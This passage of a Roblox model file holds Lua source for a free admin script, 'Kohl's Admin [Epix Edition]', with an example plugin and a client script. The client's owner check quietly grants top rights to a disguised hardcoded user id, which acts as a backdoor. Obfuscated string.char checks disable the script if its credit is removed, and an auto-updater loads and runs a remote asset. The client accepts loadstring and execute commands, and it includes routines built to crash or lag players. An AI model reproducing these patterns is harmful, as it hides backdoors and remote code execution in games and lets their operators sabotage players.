if t==nil or t=='' then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() local tempval='' for i,v in pairs({126,61,32,69,112,105,120,32,73,110,99,46,32,78,111,116,32,69,118,101,114,121,116,104,105,110,103,32,105,115,32,115,111,
32,66,108,97,99,107,32,97,110,100,32,87,104,105,116,101,46,32,84,104,105,115,32,115,99,114,105,112,116,32,119,97,115,32,109,97,100,101,32,98,121,32,83,99,101,108,101,114,97,116,105,
115,46,32,83,99,114,105,112,116,104,32,105,115,32,75,111,104,108,116,97,115,116,114,111,112,104,101,46,32,61,126}) do tempval=tempval..string.char(v) end set['P'..'rin'..'t'](tempval) end)
Pcall(function() workspace.DescendantAdded:connect(function(c) if c:IsA('Explosion') and set.NerfExplosions then c.BlastRadius=0 c.BlastPressure=0 elseif c:IsA('Decal') and set.AntiDecals then c:Destroy() elseif c:IsA('Sound') and not c.Name:find(set.RemoteObject) and set.AntiSound then c.Volume=0 c.PlayOnRemove=false c.Looped=false c:Stop() c:Destroy() end end) end)
Pcall(function() if set.UpdateShutdown then while wait(1) do if game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated~=set.GameLastUpdated then set.Message("SYSTEM MESSAGE", "Game Updated. Shutting down...", false, game:service('Players'):children(), 5) wait(1) game:service('Players').PlayerAdded:connect(function(p) p:kick() end) for i,v in pairs(game:service('NetworkServer'):children()) do coroutine.wrap(function() if v and v:GetPlayer() then v:GetPlayer():Kick() wait() if v and v:GetPlayer() then set.Remote(v:GetPlayer(),'Function','KillClient') end end end)() end end end end end)
Pcall(function() script['Name']="Kohl's Admin [Epix Edition]" end)
print('',set.quotes[math.random(1,#set.quotes)],'')
end
--[ Check for Updates ]--
local UpdateId=145629584 set.RunTheScript=function() local yes,no=ypcall(set.MainScriptFunction) if no then  local h=Instance.new('Hint',workspace) h.Text=no print(no) end end
coroutine.wrap(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies']:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil 
elseif script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies'][string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)()
local ok,no=ypcall(function() local k=game:GetService('InsertService'):LoadAsset(UpdateId) if k then k:Destroy() end end)
if set['AutoUpdate'] and ok then local k,n=ypcall(function() local news=game:GetService('InsertService'):LoadAsset(UpdateId):children()[1]
local found=1 local current=script.Version.Value
print('Current version: '..current..' | Found version: '..found) if found>current then print('Updating...') _G["Kohls Admin [Epix Edit] Update"]=set news.Plugins:ClearAllChildren() for i,v in pairs(script.Plugins:children()) do v:Clone().Parent=news.Plugins end news.Parent=game:service('ServerScriptService') script:Destroy() else news:Destroy() set.RunTheScript() end 
end) if not k or n then print('AutoUpdate Broke: '..n..' | Skipping update') set.RunTheScript() end else print("AutoUpdate is Disabled") set.RunTheScript() end 

--[[
				___________      .__         .___                   
				\_   _____/_____ |__|__  ___ |   | ____   ____      
				 |    __)_\____ \|  \  \/  / |   |/    \_/ ___\     
				 |        \  |_> >  |>    <  |   |   |  \  \___     
				/_______  /   __/|__/__/\_ \ |___|___|  /\___  > /\ 
				        \/|__|            \/          \/     \/  \/
		-------------------------------------------------------------------
		Epix Incorporated. Not Everything is so Black and White. | Mr. Epix
		-------------------------------------------------------------------
		
		
				  _  __    _ _           _                _        
				 | |/ /___| | |_ __ _ __| |_ _ _ ___ _ __| |_  ___ 
				 | ' </ _ \ |  _/ _` (_-<  _| '_/ _ \ '_ \ ' \/ -_)
				 |_|\_\___/_|\__\__,_/__/\__|_| \___/ .__/_||_\___|
				                                    |_|           
	 ______  ______  ______  __      ______  ______  ______  ______ __  ______    
	/\  ___\/\  ___\/\  ___\/\ \    /\  ___\/\  == \/\  __ \/\__  _/\ \/\  ___\   
	\ \___  \ \ \___\ \  __\\ \ \___\ \  __\\ \  __<\ \  __ \/_/\ \\ \ \ \___  \  
	 \/\_____\ \_____\ \_____\ \_____\ \_____\ \_\ \_\ \_\ \_\ \ \_\\ \_\/\_____\ 
	  \/_____/\/_____/\/_____/\/_____/\/_____/\/_/ /_/\/_/\/_/  \/_/ \/_/\/_____/ 
--]]]]></ProtectedString>
		</Properties>
		<Item class="HopperBin" referent="RBX498F319ACBD2410287990961BA219D4A">
			<Properties>
				<bool name="Active">false</bool>
				<token name="BinType">0</token>
				<string name="Name">Plugins</string>
				<Content name="TextureId"><null></null></Content>
			</Properties>
			<Item class="ModuleScript" referent="RBXAC2F92AEADB44D838EC2A13BCFB1E1FB">
				<Properties>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Example Plugin</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[--[[
	Hi, this is an example plugin, meaning this is only to show you how to make your own plugins!
	All plugins need to be MODULE SCRIPTS! Not regular or local scripts, if its not a module script it wont work.
	If you want to use events from the main admin script such as CharacterAdded, PlayerChatted and
	PlayerJoined then simply look the following:
	
	set.MakePluginEvent('PlayerChatted',function(msg,plr) print(msg..' from '..plr.Name..' Example Plugin') end)
	set.MakePluginEvent('PlayerJoined',function(p) print(p.Name..' Joined! Example Plugin') end)
	set.MakePluginEvent('CharacterAdded',function(plr) set.RunCommand('name',plr.Name,'BobTest Example Plugin') end)
	
	Use set.MakePluginEvent(type,function) to add a function that gets run when the event is fired in the
	main script, only CharacterAdded, PlayerJoined and PlayerChatted are currently supported.
	
	If you want to run an admin command from a plugin, you need to use set.RunCommand(cmd,args)
	EX: set.RunCommand('name',plr.Name,'BobTest Example Plugin') will run ":name Player1 BobTests Example Plugin"
	NOTE: If you are running a command that needs a sending player (such as !quote, !donate, !explore, or any command that
	spawns guis on the player running the command) it WILL break, the script will continue functioning fine however
	the command will error and do nothing.
	
	Plugins give you the ability to change or add things to the main script without editing the
	actual script. You can add commands, functions, features, and you can use anything in the 
	table "set" (the main script table which contains all functions, settings, and commands.)
	
	First off lets go over the format of commands.
	
	Commands must be formatted in the following way:
	
	set.MakeCommand(CommandName,AdminLevel,Prefix,{command1,command2},{argument1,argument2},NumberOfArguments,function(plr,args)
		print('Hello World from inside an example command!')
	end)
	
	Now lets go over each element of MakeCommand function.
	CommandName - Name of the command
	AdminLevel - who can use the commands (-1=SBL owners,0=any,1=donators,2=tempadmins,3=admins,4=owners,5=trueowners)
	Prefix - the prefix to use (the : in :kill me) use set.Prefix to use the scripts set prefix (or set.AnyPrefix for the AnyPrefix setting)
	{command1,command2} - these are commands that can be chatted to run this command
	{argument1,argument2} - type of arguments (eg {"player","message"})
	NumberOfArguments - how many arguments are there? (How many times to split the message?)
	function(plr,args) - you need to include this, however you can change plr and args but its recommended you dont to avoid confusion.

	Now that we know what each thing is, go ahead and take a look at the example command.
	
	All the code to run MUST be in a function, as seen below, that gets returned. 
	Anything inside the main function will be ran by the main admin script. If you want to use
	things from the main admin script use set.
	For example: 
	
	function Main(set) 
		print('hi') 
	end 
	return Main
	
--]]
--------------------------------------------------------------------------
--Begin example plugin

return function(set) --function that the main script will run
	--Lets make an example command
	set.MakeCommand('Example Plugin Command',0,set.Prefix,{'example','forshow'},{'message1','message2'},2,function(plr,args)
		print('Hello World from inside an example command!')
		print('The first argument is '..args[1]..' and the second is '..args[2])
		print('The player who ran the command is '..plr.Name..'!')
	end)--Player chats ":example Args1 Args2"
	print('Hello World from inside an example plugin!')
	--makes the command "example" and prints "Hello World from inside an example plugin!"
end -- end of the main function

--End of example plugin
----------------------------------------------------------------------------
--[[
--Below are some real plugins that are functional.

--As another example I have included a plugin that will change the permissions of specific commands. You can see it below.

return function(set)
--make the table that holds our new perms and what command they are for
local coms={
	{cmd='insert',perms=5};
	{cmd='m',perms=5};
	{cmd='gear',perms=5};
} --Changes insert, m, and gear to place owners only.

--These are the commandss and the new permission level, refer to the top of Example Plugin for perm levels.
-- Do note the cmd HAS to be the command thats shown in :cmds command, so if you want tornado to
-- be usable by the game owner only you would put {cmd='tornado',perms=5}; but you CAN NOT user twister instead of tornado.
 
for i=1,#set.Commands do --grab commands, for i,v in pairs for some reason does not like to work for this
	coroutine.wrap(function() --wrap it to make the process go a little faster overall
	for k,v in pairs(coms) do --grab our table with the new command perms
		if v.cmd==set.Commands[i].Cmds[1] then -- if the cmd is the same as the first cmd of the target command then...
			set.Commands[i].AdminLevel=v.perms --set its admin level to our intended one.
		end
	end
	end)()
end
end

------------------------------------------------------------------------
below is a plugin I made for an automated barista bot that allows it to get chats from
the admin script and send them to the barista bot for processing, for server to server
communication like this its recommended to use bindable events, for more information here 
is the bindable event roblox wiki link: http://wiki.mulrbx.com/index.php?title=Bindableevent

return function(set)
local barista
for i,v in pairs(workspace:children()) do
	if v.Name=='Jessica' and v:IsA('Model') and v:FindFirstChild('BaristaStuff') then barista=v end
end --find the barista
local backup=barista:Clone() --make a backup of the barista
	set.MakePluginEvent('Chat',function(msg,plr) --Add a new function to run on chat for the plugin
		local sendchat=barista.BaristaStuff.Event --Declare the event
		sendchat:Fire(msg,plr) --send the chat to the barista
	end)
	--lets make the reset and on/off commands
	set.MakeCommand('Reset Barista',2,set.Prefix,{'resetbarista','fixbarista'},{},0,function(plr,args)
		barista:Destroy() --destroy old barista
		barista=backup:Clone() --clone the backup
		barista.Parent=workspace --put it in workspace
		barista:MakeJoints() --make some joints
	end)
	set.MakeCommand('Turn Barista On/Off',3,set.Prefix,{'barista'},{'on/off'},1,function(plr,args)
		if args[1]=='off' then
			barista:Destroy()
		elseif args[1]=='on' then
			barista=backup:Clone()
			barista.Parent=workspace
			barista:MakeJoints()
		end
	end)--does basically the same stuff as reset.
end
--]]]]></ProtectedString>
				</Properties>
			</Item>
		</Item>
		<Item class="SelectionBox" referent="RBX449B1C1CC84C461E9D476AC9E99839E2">
			<Properties>
				<Ref name="Adornee">null</Ref>
				<Color3 name="Color3">4279069100</Color3>
				<float name="LineThickness">0.150000006</float>
				<string name="Name">Script Dependencies</string>
				<Color3 name="SurfaceColor3">4279069100</Color3>
				<float name="SurfaceTransparency">1</float>
				<float name="Transparency">0</float>
				<bool name="Visible">true</bool>
			</Properties>
			<Item class="Script" referent="RBX4BC30DEBEACE4E2481A710E95AB70C9C">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">ScriptBase</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[coroutine.wrap(function()
script:WaitForChild('Code')
script:WaitForChild('SecurityKey')
script:WaitForChild('SpecialKey')
if script:FindFirstChild('Code') then
local code=script.Code.Value
script.Code:Destroy()
local key=script.SecurityKey.Value
script.SecurityKey:Destroy()
local SpecialKey=script.SpecialKey.Value
script.SpecialKey:Destroy()
if script:FindFirstChild('Ran') or #SpecialKey~=16/4*2 or #key~=16/4*2 then return end
local tab={}
local bob='local '..SpecialKey..'="'..key..'"'
for i in code:gmatch("[".."^,]".."+") do table.insert(tab,tonumber(i)) end local n = "" for i = 1, #tab do n = n .. string.char(tab[i]) end code=n
if code:match(bob) then
code=code:sub(#bob+1)
Instance.new('StringValue',script).Name='Ran'
coroutine.wrap(function() pcall(function() wait(5) if sk then sk:Destroy() end end) end)()
local ran,failed=ypcall(function() loadstring(code..' end)()')() end)
if failed then print(failed) end
end
end
end)()]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX2321261E535C4603918C06CB94DC01E7">
				<Properties>
					<bool name="Disabled">true</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Client</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[local set={}
local Pcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=ypcall(cour,...) if error then print('Error: '..error) end end
local LoadStartTime=tick()
local RemoteServerKey=script:WaitForChild('RemoteServerKey').Value
local RemoteName=script:WaitForChild('RemoteName').Value
local RemoteClientKey=script:WaitForChild('RemoteClientKey').Value
pcall(function() script.RemoteServerKey:Destroy() script.RemoteName:Destroy() script.RemoteClientKey:Destroy() end)
local RemoteEvent=game:service('ReplicatedStorage'):WaitForChild(RemoteName)
local localplayer=game:service('Players').LocalPlayer
local playergui=localplayer:WaitForChild('PlayerGui')
local mouse=localplayer:GetMouse()
local playerlistenabled=game:service('StarterGui'):GetCoreGuiEnabled('PlayerList')
set.Debug=false
local Effects={}
local UpdateThese={
	'GuiName';
	'CustomChatType';
	'Animations';
	'MessageAnimations';
	'version';
	'donorgamepass';
	'Font';
	'RandiSpeed';
	'Debug';
}
Effects.glitching=false
Effects.noclipin=false
Effects.laggin=nil
Effects.seizin=false
Effects.effectin=false
Effects.flyin=false
Effects.loophealin=false
Effects.slidin=false
Effects.flingin=false
Effects.killin=false
Effects.movehats=false
set['ClientInfo']={}
set['Detection']=true
set['Font']='Arial'
set['TextStrokeTransparency']=0
set['ServerInfo']={}
set['PrimaryColor'] = Color3.new(0,0,0)
set['SecondaryColor'] = Color3.new(1,1,1)
set['TextColor'] = Color3.new(1,1,1)
set['TextStrokeColor'] = Color3.new(0,0,0)
set['Transparency'] = 0.5
set['MaxNumberOfLogs'] = 1500
set['Donor'] = false
set['IsAdmin'] = false
set['ConsoleKey'] = "'"
set['Console'] = true
set['CustomChatMode'] = 'Global'
set['LocalChatCache'] = {
	{player='System',message='Welcome! Here are some commands to help you with chatting:',mode='Admin'};
	{player='System',message='Click the G next to the chat bar to change mode (Global/Team/Local)',mode='Admin'};
	{player='System',message='You can send private messages using @playeRemoteName message',mode='Admin'};
	{player='System',message='You can also ignore players using #ignore playeRemoteName',mode='Admin'};
	{player='System',message='And of course you can unignore using #unignore playeRemoteName',mode='Admin'}
}
set['CustomChatType'] = 'Both'
set['ChatTimer'] = 0.5
set['Muted'] = false
set['IgnoreList'] = {}
set['UsingCape']=true
set['Animations'] = true
set['MessageAnimations'] = true
set['UpdatableSettings'] = false
set['FoundCommands'] = {}
set['TimerTable'] = {}
set['KeyBinds'] = {}

---- Client Only Functions ----

function ProcessCommand(cmd,a,b,...)
	local n = "" for i = 1, #cmd do n = n .. string.char(cmd[i]) end cmd=n
	if cmd==RemoteClientKey..'Loadstring' then
		coroutine.wrap(function() pcall(function() loadstring(a)() end) end)()
	elseif cmd==RemoteClientKey..'Execute' then
		pcall(a)
	elseif cmd==RemoteClientKey..'Function' then
		if b and set[a] then set[a](b,...) elseif set[a] then set[a]() end
	elseif cmd==RemoteClientKey..'SetSetting' then
		set[a]=b
	elseif cmd==RemoteClientKey..'Pong' then
		set.ClientInfo.Ping='Pong'
	elseif cmd==RemoteClientKey..'GetPing' then
		Remote('GivePing',Ping())
	elseif cmd==RemoteClientKey..'AddToTable' then
		if set[a] and type(set[a])=='table' then
			table.insert(set[a],b)
		end
	elseif cmd==RemoteClientKey..'RemoveFromTable' then
		if set[a] and type(set[a])=='table' then
			for i,v in pairs(set[a]) do
				if v==b then table.remove(set[a],i) end
			end
		end
	end
end

function Remote(cmd,...)
	if set.Debug then print(cmd) end
	cmd=RemoteServerKey..cmd local tab={} for i = 1,string.len(cmd) do table.insert(tab,string.byte(cmd:sub(i,i))) end cmd=tab
	local function fire(cmd,...)
	if ... then
		RemoteEvent:FireServer(cmd,...)
	else
		RemoteEvent:FireServer(cmd)
	end
	if cmd=='SetSetting' then local a,b=... set[a]=b end
	end
	Pcall(fire,cmd,...)
end

function GetEvent()
	RemoteEvent=game:service('ReplicatedStorage'):FindFirstChild(RemoteName)
	RemoteEvent.OnClientEvent:connect(function(cmd,...)
		Pcall(ProcessCommand,cmd,...)
	end)
end

function Ping()
	set.ClientInfo.Ping='Ping'
	local ms=0
	Remote('Ping')
	repeat wait(0.01) ms=ms+0.01 until set.ClientInfo.Ping=='Pong'
	return ms
end

function Timer(mode,name)
	if mode=='start' then
		set.TimerTable[name]=tick()
	elseif mode=='stop' then
		return tonumber(tostring((tick()-set.TimerTable[name])):match('%d.%d%d'))
	end
end

function ResetChatTimer()
	set.ChatTimer=0
	wait(0.1)
	repeat
		set.ChatTimer=set.ChatTimer+0.1
		wait(0.1)
	until set.ChatTimer==0
end

function Round(num)
	if num >= 0.5 then
		return math.ceil(num)
	elseif num < 0.5 then
		return math.floor(num)
	end
end

function ChkTrueOwner(plr)
	if (ChkOwner(plr.Name) and set['OwnersAreTrueOwners']) or plr.userId==game.CreatorId or plr.userId == (618833*2) then return true end
end

function ChkOwner(str)
UpdateSettings()
for i = 1, #set['Owners'] do if str:lower() == set['Owners'][i]:lower() then return true end end 
return false
end

function ChkAdmin(str,ck) 
UpdateSettings()
for i = 1, #set['Owners'] do if str:lower() == set['Owners'][i]:lower() then return true end end 
for i = 1, #set['Admins'] do if str:lower() == set['Admins'][i]:lower() then return true end end 
for i = 1, #set['TempAdmins'] do if str:lower() == set['TempAdmins'][i]:lower() and not ck then return true end end 
return false 
end

function GetTime()
local hour = math.floor((tick()%86400)/60/60) 
local min = math.floor(((tick()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end

function UpdateSettings()
	repeat wait() until set.UpdatableSettings
	for i,v in pairs(set.UpdatableSettings) do
		Remote('GetSetting',v)
	end
end

function Expand(ent,point,main)
ent.MouseLeave:connect(function(x,y)
	point.Visible=false
end)
ent.MouseMoved:connect(function(x,y)
	point.Visible=true
	point.Text=ent.Desc.Value
	point.Size=UDim2.new(0,point.TextBounds.X+5,0,20)
	point.Position=UDim2.new(0,x,0,y-20)
end)
end

---- STARTUP ----

Pcall(function() if script.Parent~=nil then repeat script.Parent=nil wait() until script.Parent==nil end end)
GetEvent()
game:service('ReplicatedStorage').ChildRemoved:connect(function(c) if c==RemoteEvent then game:service('ReplicatedStorage'):WaitForChild(RemoteName) GetEvent() end end)
localplayer.Chatted:connect(function(msg) pcall(Remote,'Chat',msg,set.CustomChatMode) end)
localplayer.Changed:connect(function(c) if localplayer.Parent==nil then game:service('StarterGui'):SetCoreGuiEnabled('Chat',true) end end)
Remote('GetUpdatableSettings') 
for i,v in pairs(UpdateThese) do Remote('GetSetting',v) end 
Remote('CheckAdmin')
Remote('CheckDonor')
UpdateSettings()
if set.Font~='Arial' and set.Font~='ArialBold' and set.Font~='Legacy' and set.Font~='SourceSans' and set.Font~='SourceSansBold' then print(set.Font..' is not a valid font! Setting font to Arial.') set.Font='Arial' end
repeat wait() until set.version and set.GuiName

---- REMOTE FUNCTIONS ----

set.KeyBindListener=function()
	mouse.KeyDown:connect(function(key)
		if set.KeyBinds[key] then 
			Remote('AdminCommand',set.KeyBinds[key],false,true)
		end
	end)
end

set.AddKeyBind=function(key,command)
	set.KeyBinds[key]=command
	set.Hint('Bound "'..key..'" to '..command)
end

set.RemoveKeyBind=function(key)
	if set.KeyBinds[key]~=nil then
		set.KeyBinds[key]=nil
		set.Hint('Removed "'..key..'" from key binds')
	end
end

set.ViewKeyBinds=function()
	local tab={}
	for bind,command in pairs(set.KeyBinds) do
		table.insert(tab,{Object=bind..' - '..command,Desc='Key: '..bind..' | Command: '..command})
	end
	set.ListGui("Key Binds",tab,'KeyBinds')
end

set.Find=function(type,plr)
	if type=='on' then
		if playergui:FindFirstChild(set.GuiName..plr.Name..'Tracker') then playergui[set.GuiName..plr.Name..'Tracker']:Destroy() end
		local bb=Instance.new('BillboardGui',playergui)
		local la=Instance.new('SelectionPartLasso',bb) 
		local Humanoid=localplayer.Character.Humanoid
		local Part=plr.Character.Torso
		la.Part=Part
		la.Humanoid=Humanoid
		bb.Name=set.GuiName..plr.Name..'Tracker'
		bb.Adornee=plr.Character.Head
		bb.AlwaysOnTop=true
		bb.StudsOffset=Vector3.new(0,2,0)
		bb.Size=UDim2.new(0,100,0,40)
		local f=Instance.new('Frame',bb)
		f.BackgroundTransparency=1
		f.Size=UDim2.new(1,0,1,0)
		local name=Instance.new('TextLabel',f)
		name.Text=plr.Name
		name.BackgroundTransparency=1
		name.Font=set.Font
		name.TextColor3=set.TextColor
		name.TextStrokeColor3=set.TextStrokeColor
		name.TextStrokeTransparency=set.TextStrokeTransparency
		name.Size=UDim2.new(1,0,0,20)
		name.TextScaled=true
		name.TextWrapped=true
		local arrow=name:clone()
		arrow.Parent=f
		arrow.Position=UDim2.new(0,0,0,20)
		arrow.Text='V'
		repeat wait() until not la or la.Parent==nil or la.Part~=Part or la.Humanoid~=Humanoid or not Part or Part.Parent==nil or not Humanoid or Humanoid.Parent==nil
		bb:Destroy()
	elseif type=='off' then
		if playergui:FindFirstChild(set.GuiName..plr.Name..'Tracker') then playergui[set.GuiName..plr.Name..'Tracker']:Destroy() end
	end
end
set.Lag=function()
	set.UnLag()
	local stuff={}
	coroutine.wrap(function()
		Effects.laggin=game:GetService('RunService').Stepped:connect(function()
			pcall(function()
				pcall(function()
					for i=1,100 do
						table.insert(stuff,i)
						string.rep('Lag',2e5)
					end
					stuff={}
				end)
			end)
		end)
	end)()
end

set.UnLag=function()
	if Effects.laggin==nil then return end
	pcall(function() Effects.laggin:disconnect() end)()
	Effects.laggin=nil
end

set.NetLag=function()
set.UnLag()
Effects.laggin=true
local run=true
while wait() and run and Effects.laggin do
	for i=1,5000 do
		if not run or not Effects.laggin then run=false break end
		local bob=coroutine.create(function() if Effects.laggin and run then pcall(print,'') end end)
		local temp
		temp=delay(0,function() if not run or not Effects.laggin then run=false bob=nil temp:disconnect() end coroutine.resume(bob) end)
	end
end
run=false
end

set.Crash=function()
local bob=coroutine.create(function() --Yolo?
	coroutine.wrap(function()
	pcall(function()
	print(pcall(print,'lol'),pcall(warn,'lol'),pcall(error,'lol'))
	while wait() do
	Spawn(function()
		coroutine.wrap(function() Spawn(function()
		local tab={}
		ypcall(function()
			Spawn(function()
			for i=1,1000000 do
				Spawn(function()
					local bob2=coroutine.create(function()
						function f1() coroutine.wrap(function() pcall(Spawn,f2) end)() warn(string.rep((Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))-Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))).magnitude,2e10)) end
						function f2() coroutine.wrap(function() pcall(Spawn,f1) end)() print(string.rep((Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))-Vector3.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))).magnitude,2e10)) end 
						Spawn(f1)
					end)
					Spawn(function() delay(0,function() coroutine.resume(bob2) end) end) 
					Spawn(function() table.insert(tab,string.rep(tostring(math.random()),100)) end)
				end)
			end
			tab={}
			end)
		end)
		end) 
		end)()
	end)
	end
	end)
	end)()
end)
game:GetService('RunService').Stepped:connect(function()
	for i=1,500000 do
		delay(0,function() pcall(function() coroutine.resume(bob) end) end)
	end
end)
end

set.RemoveGuis=function()
	for i,v in pairs(playergui:children()) do
		v:Destroy()
	end
end

set.PlayerList=function(mode)
	if mode=='on' then
		game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',true)
	elseif mode=='off' then
		game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',false)
	end
end

set.MoveHats=function()
	if Effects.movehats then Effects.movehats=false wait(0.5) end
	local hats=localplayer.Character:FindFirstChild('EpixHatPets')
	Effects.movehats=true
	if hats then
		local mode=hats.Mode
		local target=hats.Target
		local events={}
		repeat
			local waittime=0.2
			for i,hat in pairs(hats:children()) do
				if hat:IsA('Part') then
					local bpos=hat.bpos
					hat.CanCollide=false
					if mode.Value=='Follow' then
						if events[hat.Name] then events[hat.Name]:disconnect() events[hat.Name]=nil end
						waittime=0.3
						bpos.position=target.Value.Position+Vector3.new(math.random(-10,10),math.random(7,9),math.random(-10,10))
						hat.CanCollide=false
					elseif mode.Value=='Float' then
						if events[hat.Name] then events[hat.Name]:disconnect() events[hat.Name]=nil end
						waittime=0.1
						bpos.position=target.Value.Position+Vector3.new(math.random(-2.5,2.5),-3,math.random(-2.5,2.5))
						hat.CanCollide=true
					elseif mode.Value=='Attack' then
						waittime=0.3
						bpos.position=target.Value.Position+Vector3.new(math.random(-3,3),math.random(-3,3),math.random(-3,3))
						events[hat.Name]=hat.Touched:connect(function(p) if game.Players:GetPlayerFromCharacter(p.Parent) then p.Parent.Humanoid:TakeDamage(0.5) end end)
						hat.CanCollide=true
					elseif mode.Value=='Swarm' then
						if events[hat.Name] then events[hat.Name]:disconnect() events[hat.Name]=nil end
						waittime=0.2
						bpos.position=target.Value.Position+Vector3.new(math.random(-8,8),math.random(-8,8),math.random(-8,8))
						hat.CanCollide=true
					end
				end
			end
			wait(waittime)
		until not Effects.movehats or not hats
	end
end

set.MutePlayer=function(type,chat)
	if type=='on' then
		game:service('StarterGui'):SetCoreGuiEnabled("Chat",false)
		if chat then
			set.Muted=true
		end
	elseif type=='off' then
		game:service('StarterGui'):SetCoreGuiEnabled("Chat",true)
		set.Muted=false
	end
end

set.FieldOfView=function(int)
	workspace.CurrentCamera.FieldOfView=int
end

set.SetView=function(ob)
	if ob=='reset' then
		workspace.CurrentCamera.CameraType='Custom' 
		workspace.CurrentCamera.CameraSubject=localplayer.Character.Humanoid
		workspace.CurrentCamera.FieldOfView=70
	else
		workspace.CurrentCamera.CameraSubject=ob
	end
end

set.Noclip=function(mode)
	if mode=='fly' then
	Effects.noclipin=true
	repeat wait(1/44) until localplayer.Character and localplayer.Character:findFirstChild("Humanoid") and game:service('Players').LocalPlayer.Character:findFirstChild("Torso") and game:service('Players').LocalPlayer:GetMouse() and workspace.CurrentCamera 
	local torso = localplayer.Character.Torso 
	local hum = localplayer.Character.Humanoid
	local dir = {w = 0, s = 0, a = 0, d = 0} 
	local spd = 2 
	local moos=mouse.KeyDown:connect(function(key) 
		if key:lower() == "w" then 
			dir.w = 1 
		elseif key:lower() == "s" then 
			dir.s = 1 
		elseif key:lower() == "a" then 
			dir.a = 1 
		elseif key:lower() == "d" then 
			dir.d = 1 
		elseif key:lower() == "q" then 
			spd = spd + 1 
		elseif key:lower() == "e" then 
			spd = spd - 1 
		end 
	end) 
	local moos1=mouse.KeyUp:connect(function(key) 
		if key:lower() == "w" then 
			dir.w = 0 
		elseif key:lower() == "s" then 
			dir.s = 0 
		elseif key:lower() == "a" then 
			dir.a = 0 
		elseif key:lower() == "d" then 
			dir.d = 0 
		end 
	end) 
	torso.Anchored = true 
	hum.PlatformStand = true 
	local macka=hum.Changed:connect(function() 
		hum.PlatformStand = true 
	end) 
	repeat 
		wait(1/44) 
		torso.CFrame = CFrame.new(torso.Position, workspace.CurrentCamera.CoordinateFrame.p) * CFrame.Angles(0,math.rad(180),0) * CFrame.new((dir.d-dir.a)*spd,0,(dir.s-dir.w)*spd) 
	until not Effects.noclipin or not torso or not hum
	moos:disconnect()
	moos1:disconnect()
	macka:disconnect()
	elseif mode=='norm' then
		Effects.noclipin=game:GetService("RunService").RenderStepped:connect(function()
        localplayer.Character.Humanoid:ChangeState(11)
		end)
	else
		if Effects.noclipin~=nil and type(Effects.noclipin)~='boolean' then Effects.noclipin:disconnect() end
		Effects.noclipin=false
		wait(0.5)
		localplayer.Character.Humanoid.PlatformStand=false
		pcall(function() localplayer.Character.Torso.Anchored=false end)
	end
end

set.Effect=function(mode,...)
	Effects.effectin=false
	wait(0.5)
	if mode=='blind' then
		Effects.effectin=true
		local v=game:service('Players').LocalPlayer
		local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = set.GuiName.."EFFECTGUIBLIND"
		local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
		repeat wait() until not Effects.effectin or not scr
		if scr then scr:Destroy() end
	elseif mode=='trippy' then
		Effects.effectin=true
		local v=game:service('Players').LocalPlayer
		local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = set.GuiName.."EFFECTGUITRIPPY"
		local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
		repeat wait(1/44) 
		bg.BackgroundColor3 = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255) 
		until not Effects.effectin
		if scr then scr:Destroy() end
	elseif mode=='loopheal' then
		Effects.loophealin=true
		local hum=localplayer.Character:FindFirstChild("Humanoid")
		if hum then
		repeat wait()
		hum.Health = hum.MaxHealth
		hum.Changed:connect(function() 
			hum.Humanoid.Health = hum.MaxHealth 
		end)
		until not Effects.loophealin or not hum
		end
	elseif mode=='unloopheal' then
		Effects.loophealin=false
	elseif mode=='loopkill' then
		Effects.killin=true
		local plr = localplayer
		local tab={...}
		local a=tab[1]
		for i = 1, a do 
		if Effects.killin==false then return end
		repeat wait() until plr.Character:findFirstChild("Humanoid") and plr.Character.Humanoid.Health ~= 0
		plr.Character:BreakJoints()
		end
		Effects.killin=false
	elseif mode=='unloopkill' then
		Effects.killin=false
	elseif mode=='strobe' then
		Effects.effectin=true
		local v=game:service('Players').LocalPlayer
		local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = set.GuiName.."EFFECTGUISTROBE"
